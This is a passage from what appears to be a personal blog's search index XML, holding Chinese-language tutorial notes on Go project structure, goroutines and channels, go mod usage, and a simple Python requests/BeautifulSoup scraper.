  </entry>
  <entry>
    <title>golang项目结构</title>
    <url>/2021/07/17/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Go%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<p>GOPATH下的src目录就是接下来开发程序的主要目录，所有的源码都是放在这个目录下面，那么一般我们的做法就是一个目录一个项目，例如: $GOPATH/src/mymath 表示mymath这个应用包或者可执行应用，这个根据package是main还是其他来决定，main的话就是可执行应用，其他的话就是应用包</p>
<p>所以当新建应用或者一个代码包时都是在src目录下新建一个文件夹，文件夹名称一般是代码包名称，当然也允许多级目录，例如在src下面新建了目录$GOPATH/src/github.com/astaxie/beedb 那么这个包路径就是&quot;<a href="http://github.com/astaxie/beedb">github.com/astaxie/beedb</a>&quot;，包名称是最后一个目录beedb</p>
<pre><code>bin/
    mathapp
pkg/
    平台名/ 如：darwin_amd64、linux_amd64
         mymath.a
         github.com/
              astaxie/
                   beedb.a
src/
    mathapp
          main.go
      mymath/
          sqrt.go
      github.com/
           astaxie/
                beedb/
                    beedb.go
                    util.go
</code></pre>
<p>Go程序是通过<code>package</code>来组织的</p>
<p><code>package &lt;pkgName&gt;</code>（在我们的例子中是<code>package main</code>）这一行告诉我们当前文件属于哪个包，而包名<code>main</code>则告诉我们它是一个可独立运行的包，它在编译后会产生可执行文件。除了<code>main</code>包之外，其它的包最后都会生成<code>*.a</code>文件（也就是包文件）并放置在<code>$GOPATH/pkg/$GOOS_$GOARCH</code>中（以Mac为例就是<code>$GOPATH/pkg/darwin_amd64</code>）</p>
<blockquote>
<p>每一个可独立运行的Go程序，必定包含一个<code>package main</code>，在这个<code>main</code>包中必定包含一个入口函数<code>main</code>，而这个函数既没有参数，也没有返回值。</p>
</blockquote>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>go</category>
      </categories>
      <tags>
        <tag>go</tag>
      </tags>
  </entry>
  <entry>
    <title>golang并发</title>
    <url>/2021/07/21/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/%E5%B9%B6%E5%8F%91/</url>
    <content><![CDATA[<h2 id="goroutine"><a class="header-anchor" href="#goroutine"></a>goroutine</h2>
<p>goroutine是Go并行设计的核心。goroutine说到底其实就是线程，但是它比线程更小，十几个goroutine可能体现在底层就是五六个线程，Go语言内部帮你实现了这些goroutine之间的内存共享。执行goroutine只需极少的栈内存(大概是4~5KB)，当然会根据相应的数据伸缩。也正因为如此，可同时运行成千上万个并发任务。goroutine比thread更易用、更高效、更轻便。</p>
<pre><code class="language-go">//通过关键字go就启动了一个goroutine
go hello(a, b, c)
</code></pre>
<pre><code class="language-go">package main

import (
    &quot;fmt&quot;
    &quot;runtime&quot;
)

func say(s string) {
    for i := 0; i &lt; 3; i++ {
        runtime.Gosched()	//时间片轮转
        fmt.Println(s)
    }
}

func main() {
    go say(&quot;world&quot;) //开一个新的Goroutines执行
    say(&quot;hello&quot;) //当前Goroutines执行
}

// 以上程序执行后将输出：
// 每次运行结果可能不同
</code></pre>
<p>默认情况下，调度器仅使用单线程，也就是说只实现了并发。想要发挥多核处理器的并行，需要在我们的程序中显式调用 <code>runtime.GOMAXPROCS(n) </code>告诉调度器同时使用多个线程。GOMAXPROCS 设置了同时运行逻辑代码的系统线程的最大数量，并返回之前的设置。如果n &lt; 1，不会改变当前设置。以后Go的新版本中调度得到改进后，这将被移除。</p>
<h2 id="channel"><a class="header-anchor" href="#channel"></a>channel</h2>
<p>在线程之间常常使用channel（通道）进行通信</p>
<h3 id="channel的声明"><a class="header-anchor" href="#channel的声明"></a>channel的声明</h3>
<p>定义一个channel时，也需要定义发送到channel的值的类型。注意，必须使用make 创建channel：</p>
<pre><code class="language-go">ci := make(chan int)
cs := make(chan string)
cf := make(chan interface{})
</code></pre>
<p>channel通过操作符<code>&lt;-</code>来接收和发送数据</p>
<pre><code class="language-go">ch &lt;- v    // 发送v到channel ch.
v := &lt;-ch  // 从ch中接收数据，并赋值给v
</code></pre>
<h3 id="channel的阻塞机制"><a class="header-anchor" href="#channel的阻塞机制"></a>channel的阻塞机制</h3>
<p>默认情况下，channel的发送和接收都是阻塞的，只有当发送方和接收方都准备好时才能成功传输数据。例如当发送线程想要发送数据到channel1，而暂时没有线程接收消息，那么该发送线程阻塞，直到有线程从channel1接收消息。</p>
<h3 id="Buffered-Channels"><a class="header-anchor" href="#Buffered-Channels"></a>Buffered Channels</h3>
<p>当我们不想让channel阻塞时，可以给每个channel设置缓存区</p>
<pre><code class="language-go">ch := make(chan type, n)

n == 0 ! 无缓存（阻塞）
n &gt; 0 ! 缓存（非阻塞，直到 n 个元素）
</code></pre>
<p><code>ch:= make(chan bool, 4)</code>，创建了可以存储4个元素的bool 型channel。在这个channel 中，前4个元素可以无阻塞的写入。当写入第5个元素时，代码将会阻塞，直到其他goroutine从channel 中读取一些元素，腾出空间</p>
<h3 id="range-and-close"><a class="header-anchor" href="#range-and-close"></a>range and close</h3>
<p>channel 和slice、map一样，可以使用range在for循环中读取出数值</p>
<p><code>for i := range c</code>能够不断的读取channel里面的数据，直到该channel被显式的关闭（<code>close(c)</code>）</p>
<p>在消费方可以通过语法<code>v, ok := &lt;-ch</code>测试channel是否被关闭。如果ok返回false，那么说明channel已经没有任何数据并且已经被关闭。</p>
<p>记住应该在生产者的地方关闭channel，而不是消费的地方去关闭它，这样容易引起panic</p>
<p>另外记住一点的就是channel不像文件之类的，不需要经常去关闭，只有当你确实没有任何发送数据了，或者你想显式的结束range循环之类的</p>
<h3 id="select"><a class="header-anchor" href="#select"></a>select</h3>
<p>select 用于处理多个channel，与 switch 语句相比，select 有比较多的限制，其中最大的一条限制就是每个 case 语句里必须是一个 IO 操作，大致的结构如下：</p>
<pre><code class="language-go">select {
  case &lt;-chan1:
  // 如果chan1成功读到数据，则进行该case处理语句
  case chan2 &lt;- 1:
  // 如果成功向chan2写入数据，则进行该case处理语句
  default:
  // 如果上面都没有成功，则进入default处理流程
}
</code></pre>
<p>在一个 select 语句中，Go语言会按顺序从头至尾评估每一个发送和接收的语句。</p>
<p>如果其中的任意一语句可以继续执行（即没有被阻塞），那么就从那些可以执行的语句中任意选择一条来使用。</p>
<p>如果没有任意一条语句可以执行（即所有的通道都被阻塞），那么有如下两种可能的情况：</p>
<ul>
<li>如果给出了 default 语句，那么就会执行 default 语句，同时程序的执行会从 select 语句后的语句中恢复；</li>
<li>如果没有 default 语句，那么 select 语句将被阻塞，直到至少有一个通信可以进行下去。</li>
</ul>
<p>select常用于做超时处理</p>
<pre><code class="language-go">package main

import (
    &quot;fmt&quot;
    &quot;time&quot;
)

func main() {
    ch := make(chan int)
    quit := make(chan bool)

    //新开一个协程
    go func() {
        for {
            select {
            case num := &lt;-ch:
                fmt.Println(&quot;num = &quot;, num)
            case &lt;-time.After(3 * time.Second):
                fmt.Println(&quot;超时&quot;)
                quit &lt;- true
            }
        }

    }() //别忘了()

    for i := 0; i &lt; 5; i++ {
        ch &lt;- i
        time.Sleep(time.Second)
    }

    &lt;-quit
    fmt.Println(&quot;程序结束&quot;)
}
</code></pre>
<p>运行结果如下：</p>
<blockquote>
<p>num = 0<br>
num = 1<br>
num = 2<br>
num = 3<br>
num = 4<br>
超时<br>
程序结束</p>
</blockquote>
<h2 id="runtime-goroutine"><a class="header-anchor" href="#runtime-goroutine"></a>runtime goroutine</h2>
<p>runtime包中有几个处理goroutine的函数：</p>
<ul>
<li>
<p>Goexit</p>
<p>退出当前执行的goroutine，但是defer函数还会继续调用</p>
</li>
<li>
<p>Gosched</p>
<p>让出当前goroutine的执行权限，调度器安排其他等待的任务运行，并在下次某个时候从该位置恢复执行。</p>
</li>
<li>
<p>NumCPU</p>
<p>返回 CPU 核数量</p>
</li>
<li>
<p>NumGoroutine</p>
<p>返回正在执行和排队的任务总数</p>
</li>
<li>
<p>GOMAXPROCS</p>
<p>用来设置可以并行计算的CPU核数的最大值，并返回之前的值。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>go</category>
      </categories>
      <tags>
        <tag>go</tag>
        <tag>并发</tag>
      </tags>
  </entry>
  <entry>
    <title>golang mod包管理</title>
    <url>/2021/07/21/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/mod%E5%8C%85%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<p>环境变量 GO111MODULE=on 时， go modules 功能开启，go依赖包的存放和查找位置为</p>
<blockquote>
<p>$GOPATH/pkg/mod</p>
</blockquote>
<p>golang提供了 go mod 命令来使⽤ go modules 管理包</p>
<p>开启 go modules 功能后的包查找路径为<code>项⽬⽬录/vendor</code>-&gt;<code>$GOPATH/pkg/mod</code></p>
<p>该⽅式下go项⽬源码不⼀定要保存在<code>$GOPATH/src</code>⽬录下</p>
<p>mod命令</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>download</td>
<td>下载依赖包</td>
</tr>
<tr>
<td>init</td>
<td>初始化go.mod</td>
</tr>
<tr>
<td>verify</td>
<td>在当前目录初始化mod</td>
</tr>
<tr>
<td>edit</td>
<td>编辑go.mod</td>
</tr>
<tr>
<td>tidy</td>
<td>拉取缺少的模块，移除不⽤的模块</td>
</tr>
<tr>
<td>graph</td>
<td>打印模块依赖图</td>
</tr>
<tr>
<td>vendor</td>
<td>将依赖复制到项目的vendor目录下</td>
</tr>
<tr>
<td>verify</td>
<td>验证依赖是否正确</td>
</tr>
</tbody>
</table>
<p>使用示例：</p>
<p>现有源文件如下</p>
<pre><code class="language-text">$ ls
main.go

$ cat main.go
package main
import (
	&quot;go.uber.org/zap&quot;
)
func main() {
    logger, _ := zap.NewProduction()
    defer logger.Sync()
    sugar := logger.Sugar()
    sugar.Info(&quot;hello world&quot;)
}
</code></pre>
<p>在项⽬⽬录下使⽤<code>go mod init</code>初始化项⽬，后⾯可以跟包名</p>
<p>如<code>go mod init github.com/jacksonyoudi/gomodone</code></p>
<p>此时项⽬⽬录下多出了<code>go.mod</code>⽂件，但⽂件中还没有描述任何引⼊包</p>
<pre><code class="language-text">$ go mod init
go: creating new go.mod: module helloworld
$ ls
go.mod main.go
$ cat go.mod
module helloworld
go 1.16
</code></pre>
<p>使⽤<code>go mod tidy</code>更新项⽬中的依赖包，此时源⽂件中的zap包被加⼊到mod⽂件中，且⽣成了最新的<code>go.sum</code>⽂件</p>
<pre><code class="language-text">$ go mod tidy
go: finding module for package go.uber.org/zap
go: found go.uber.org/zap in go.uber.org/zap v1.17.0
$ ls
go.mod go.sum main.go
$ cat go.mod
module helloworld
go 1.16
require go.uber.org/zap v1.17.0
</code></pre>
<p>go.mod⽂件⼀旦创建后，它的内容将会被go toolchain全⾯掌控。</p>
<p>go toolchain会在各类命令（如go get、go build、go mod等）执⾏时，修改和维护go.mod⽂件</p>
<blockquote>
<p>go.mod 提供了 <code>module</code>、<code>require</code>、<code>replace</code> 和 <code>exclude</code> 四个命令</p>
<p><code>module</code> 语句指定包的名字（路径）</p>
<p><code>require</code> 语句指定的依赖项模块（常用）</p>
<p><code>replace</code> 语句可以替换依赖项模块（常用)</p>
<p><code>exclude</code> 语句可以忽略依赖项模块</p>
</blockquote>
<p>⼀个典型go.mod⽂件</p>
<pre><code class="language-go">module golang_exp
go 1.16
require (
    github.com/valyala/fasthttp v1.26.0
    go.etcd.io/bbolt v1.3.5
    golang.org/x/net v0.0.0-20210521195947-fe42d452be8f
    golang.org/x/sys v0.0.0-20210521203332-0cec03c779c1
    google.golang.org/genproto v0.0.0-20210524171403-669157292da3
    google.golang.org/grpc v1.38.0
)
replace (
    //使用本地包来替换导入包
    //包导入名 =&gt; 本地包相对路径/绝对路径
    firstgo/packagetest1 =&gt; ../packagetest1
    firstgo/packagetest2 =&gt; ../packagetest2
    
)
</code></pre>
<p>导入本地<code>module</code>:<a href="https://www.cnblogs.com/sebuntin2020/p/12435343.html">https://www.cnblogs.com/sebuntin2020/p/12435343.html</a></p>
<p>import 如下</p>
<p><img src="/2021/07/21/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/mod%E5%8C%85%E7%AE%A1%E7%90%86/image-20210713150318009.png" alt="image-20210713150318009"></p>
<p>go.mod 如下</p>
<p><img src="/2021/07/21/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/mod%E5%8C%85%E7%AE%A1%E7%90%86/image-20210713150712969.png" alt="image-20210713150712969"></p>
<p>之所以要是 <a href="http://github.com/myModule">github.com/myModule</a> 的格式，是因为在 go1.13及以上版本 中， go module 名称规范要求路径的第一部分必须满足域名规范，否则可能会报类似 <code>malformed module path &quot;myModule&quot;: missing dot in first path element</code> 这样的错误。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>go</category>
      </categories>
      <tags>
        <tag>go</tag>
      </tags>
  </entry>
  <entry>
    <title>Python实战</title>
    <url>/2021/01/31/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/Python%E5%AE%9E%E6%88%98%E7%AF%87/</url>
    <content><![CDATA[<h2 id="Python爬虫"><a class="header-anchor" href="#Python爬虫"></a>Python爬虫</h2>
<p>从<a href="http://www.csu.edu.cn/index/xndh.htm">中南大学校内导航</a>中爬取校内网站名称和对应的链接。</p>
<p>爬虫程序主要分为html页面获取和数据提取两个部分，接下来分别说明其实现方法。</p>
<h3 id="获取网页"><a class="header-anchor" href="#获取网页"></a>获取网页</h3>
<p>使用requests库来获取网站的html页面</p>
<pre><code class="language-python">import requests
url = &quot;http://www.csu.edu.cn/index/xndh.htm&quot;
try:
    r = requests.get(url)
    r.raise_for_status()				#检查r的状态码是否为200，若不是则抛出异常
    r.encoding = r.apparent_encoding	#设置编码方式为从内容中分析出的编码方式
except:
    print(&quot;error!&quot;)
</code></pre>
<p><img src="/2021/01/31/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/Python%E5%AE%9E%E6%88%98%E7%AF%87/20200225122713475.png" alt="img"></p>
<p>encoding是从http中的header中的charset字段中提取的编码方式，若header中没有charset字段则默认为ISO-8859-1编码模式，则无法解析中文，产生乱码</p>
<h3 id="提取内容"><a class="header-anchor" href="#提取内容"></a>提取内容</h3>
<p>利用BeautifulSoup库可以很方便地对从HTML或XML文档中提取我们想要的数据。</p>
<pre><code class="language-python">from bs4 import BeautifulSoup
html = r.text
soup = BeautifulSoup(html,'html.parser')		#将html解析成BeautifulSoup对象

#BeautifulSoup类的find_all()函数可以从文档树中找到特定的标签（tag）
#这里获得所有的a标签
for i in soup.find_all('a'):
    #tag的属性值可直接用 tag_name['属性名'] 的方式获得
    #判断链接地址是否为一个网站
    if not i['href'].find('http'):
        # 构造输出
        # tag_name.string 即 &lt;tag_name&gt;xxx&lt;/tag_name&gt; 中的xxx
        str1 = &quot;网址：&quot; + str(i['href']) + &quot;   名称：&quot; + str(i.string) + '\n'
		# 输出一条链接的地址及名称
        print(str1)
</code></pre>
<p>利用以上代码就可以实现一个简单的爬虫程序了。</p>
<p>爬虫的原理比较简单，关键在于如何对爬取到的数据进行筛选的过程。</p>
<p>之后可以尝试对网页中的链接进行递归爬取等</p>
<h3 id="链接去重"><a class="header-anchor" href="#链接去重"></a>链接去重</h3>
<h3 id="并发爬取"><a class="header-anchor" href="#并发爬取"></a>并发爬取</h3>
<h2 id="爬虫框架"><a class="header-anchor" href="#爬虫框架"></a>爬虫框架</h2>
<h3 id="scrapy"><a class="header-anchor" href="#scrapy"></a>scrapy</h3>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
</search>
